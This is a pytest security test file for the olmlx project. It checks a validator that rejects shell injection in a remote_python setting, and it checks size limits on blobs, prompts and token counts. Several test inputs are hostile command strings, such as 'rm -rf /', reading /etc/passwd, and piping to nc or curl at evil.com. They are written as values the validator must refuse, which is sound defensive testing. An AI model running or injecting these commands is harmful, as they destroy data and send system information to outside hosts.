"""Security tests for issues #121 and #122."""

import hashlib

import pytest
from pydantic import ValidationError

from olmlx.schemas.chat import Message
from olmlx.schemas.common import ModelOptions
from olmlx.schemas.generate import GenerateRequest


class TestRemotePythonValidation:
    """Bug #121: SSH command injection via remote_python config."""

    def test_simple_python_allowed(self):
        from olmlx.cli import validate_remote_python

        # Should not raise
        validate_remote_python("python")
        validate_remote_python("python3")
        validate_remote_python("/usr/bin/python3")

    def test_uv_run_python_allowed(self):
        from olmlx.cli import validate_remote_python

        validate_remote_python("uv run python")

    def test_path_with_dots_and_dashes_allowed(self):
        from olmlx.cli import validate_remote_python

        validate_remote_python("/home/user/.local/bin/python3")
        validate_remote_python("python3.11")

    def test_shell_injection_semicolon_rejected(self):
        from olmlx.cli import validate_remote_python

        with pytest.raises(ValueError, match="Invalid remote_python"):
            validate_remote_python("python; rm -rf /")

    def test_shell_injection_backtick_rejected(self):
        from olmlx.cli import validate_remote_python

        with pytest.raises(ValueError, match="Invalid remote_python"):
            validate_remote_python("python `whoami`")

    def test_shell_injection_dollar_paren_rejected(self):
        from olmlx.cli import validate_remote_python

        with pytest.raises(ValueError, match="Invalid remote_python"):
            validate_remote_python("python $(cat /etc/passwd)")

    def test_shell_injection_pipe_rejected(self):
        from olmlx.cli import validate_remote_python

        with pytest.raises(ValueError, match="Invalid remote_python"):
            validate_remote_python("python | nc evil.com 1234")

    def test_shell_injection_ampersand_rejected(self):
        from olmlx.cli import validate_remote_python

        with pytest.raises(ValueError, match="Invalid remote_python"):
            validate_remote_python("python & curl evil.com")

    def test_shell_injection_redirect_rejected(self):
        from olmlx.cli import validate_remote_python

        with pytest.raises(ValueError, match="Invalid remote_python"):
            validate_remote_python("python > /tmp/out")

    def test_empty_rejected(self):
        from olmlx.cli import validate_remote_python

        with pytest.raises(ValueError, match="Invalid remote_python"):
            validate_remote_python("")

    def test_tab_rejected(self):
        from olmlx.cli import validate_remote_python

        with pytest.raises(ValueError, match="Invalid remote_python"):
            validate_remote_python("python\t--version")

    def test_newline_rejected(self):
        from olmlx.cli import validate_remote_python

        with pytest.raises(ValueError, match="Invalid remote_python"):
            validate_remote_python("python\n--version")


class TestBlobUploadSizeLimit:
    """Bug #122: Unbounded blob upload."""

    @pytest.mark.asyncio
    async def test_upload_blob_within_limit(self, app_client):
        """Small blobs should still work."""
        data = b"small blob"
        digest = "sha256:" + hashlib.sha256(data).hexdigest()
        resp = await app_client.post(f"/api/blobs/{digest}", content=data)
        assert resp.status_code == 201

    @pytest.mark.asyncio
    async def test_upload_blob_exceeds_limit(self, app_client, monkeypatch):
        """Blobs exceeding the size limit should be rejected."""
        # Patch the limit to something small for testing
        monkeypatch.setattr("olmlx.routers.blobs.MAX_BLOB_SIZE", 100)
        data = b"x" * 200
        digest = "sha256:" + hashlib.sha256(data).hexdigest()
        resp = await app_client.post(f"/api/blobs/{digest}", content=data)
        assert resp.status_code == 413

    @pytest.mark.asyncio
    async def test_upload_blob_malformed_content_length(self, app_client):
        """Malformed Content-Length should not cause a 500."""
        data = b"small blob"
        digest = "sha256:" + hashlib.sha256(data).hexdigest()
        resp = await app_client.post(
            f"/api/blobs/{digest}",
            content=data,
            headers={"content-length": "not-a-number"},
        )
        # Should either succeed (falls through to body check) or 4xx, never 500
        assert resp.status_code != 500


class TestMessageContentMaxLength:
    """Bug #122: No max_length on message content."""

    def test_content_within_limit(self):
        msg = Message(role="user", content="hello")
        assert msg.content == "hello"

    def test_content_at_max_length(self):
        content = "a" * 1_000_000
        msg = Message(role="user", content=content)
        assert len(msg.content) == 1_000_000

    def test_content_exceeds_max_length(self):
        content = "a" * 1_000_001
        with pytest.raises(ValidationError, match="content"):
            Message(role="user", content=content)


class TestPromptMaxLength:
    """Bug #122: No max_length on generate prompt."""

    def test_prompt_within_limit(self):
        req = GenerateRequest(model="test", prompt="hello")
        assert req.prompt == "hello"

    def test_prompt_exceeds_max_length(self):
        prompt = "a" * 1_000_001
        with pytest.raises(ValidationError, match="prompt"):
            GenerateRequest(model="test", prompt=prompt)


class TestNumPredictUpperBound:
    """Bug #122: No upper bound on num_predict."""

    def test_num_predict_within_limit(self):
        opts = ModelOptions(num_predict=131072)
        assert opts.num_predict == 131072

    def test_num_predict_exceeds_upper_bound(self):
        with pytest.raises(ValidationError, match="num_predict"):
            ModelOptions(num_predict=131073)

    def test_num_predict_special_values_still_work(self):
        """Special values -1 (infinite) and -2 (fill context) must still work."""
        opts = ModelOptions(num_predict=-1)
        assert opts.num_predict == -1
        opts = ModelOptions(num_predict=-2)
        assert opts.num_predict == -2


class TestAnthropicMaxTokensUpperBound:
    """Bug #122: Add upper bound to Anthropic max_tokens."""

    def test_max_tokens_within_limit(self):
        from olmlx.schemas.anthropic import AnthropicMessage, AnthropicMessagesRequest

        req = AnthropicMessagesRequest(
            model="test",
            messages=[AnthropicMessage(role="user", content="hi")],
            max_tokens=131072,
        )
        assert req.max_tokens == 131072

    def test_max_tokens_exceeds_upper_bound(self):
        from olmlx.schemas.anthropic import AnthropicMessage, AnthropicMessagesRequest

        with pytest.raises(ValidationError, match="max_tokens"):
            AnthropicMessagesRequest(
                model="test",
                messages=[AnthropicMessage(role="user", content="hi")],
                max_tokens=131073,
            )


class TestOpenAIMaxTokensUpperBound:
    """Bug #122: Add upper bound to OpenAI max_tokens."""

    def test_max_tokens_within_limit(self):
        from olmlx.schemas.openai import OpenAIChatMessage, OpenAIChatRequest

        req = OpenAIChatRequest(
            model="test",
            messages=[OpenAIChatMessage(role="user", content="hi")],
            max_tokens=131072,
        )
        assert req.max_tokens == 131072

    def test_max_tokens_exceeds_upper_bound(self):
        from olmlx.schemas.openai import OpenAIChatMessage, OpenAIChatRequest

        with pytest.raises(ValidationError, match="max_tokens"):
            OpenAIChatRequest(
                model="test",
                messages=[OpenAIChatMessage(role="user", content="hi")],
                max_tokens=131073,
            )

    def test_max_completion_tokens_exceeds_upper_bound(self):
        from olmlx.schemas.openai import OpenAIChatMessage, OpenAIChatRequest

        with pytest.raises(ValidationError, match="max_completion_tokens"):
            OpenAIChatRequest(
                model="test",
                messages=[OpenAIChatMessage(role="user", content="hi")],
                max_completion_tokens=131073,
            )
